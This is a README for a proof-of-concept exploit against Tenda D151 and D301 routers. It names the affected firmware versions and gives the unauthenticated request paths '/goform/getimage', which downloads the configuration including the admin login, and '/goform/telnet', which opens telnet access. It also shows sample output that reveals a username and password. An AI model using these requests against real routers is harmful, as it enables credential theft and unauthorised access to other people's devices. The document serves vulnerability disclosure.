# Tenda D151 D301 exploit (Proof of Concept)


__Exploit Title__: Tenda D151 & D301 - Unauthenticated configuration download (login included)


- Exploit Author: BenChaliah

- Vendor Homepage: https://www.tendacn.com

- Software Link: https://www.tendacn.com/us/download/detail-3331.html

- Versions:    
  - D301 1.2.11.2_EN
  - D301 V2.0 50.22.1.8_EN
  - D151 V2.0 50.21.1.5_EN


#### Description

This exploits allows for the download of the current router config including the admin login, just by requesting `{IP}/goform/getimage`, you can also activate telnet service by requesting `/goform/telnet` (the service is already on by default, but this will execute an `iptable` command allowing access).

⚠️ Telnet activation issue exists in many other tenda devices too.

The configuration exists in the last part of the downloaded firmware image.



__Usage__ (Python 2.7):

```shell
$ python exploit.py http://192.168.1.1
        _  _
  ___ (~ )( ~)
 /   \_\ \/ /   
|   D_ ]\ \/  -- By BenCh@li@h
|   D _]/\ \  -- github.com/BenChaliah
 \___/ / /\ \
      (_ )( _)
          

[!] Downloading config
	username: admin
	password: testpass
```
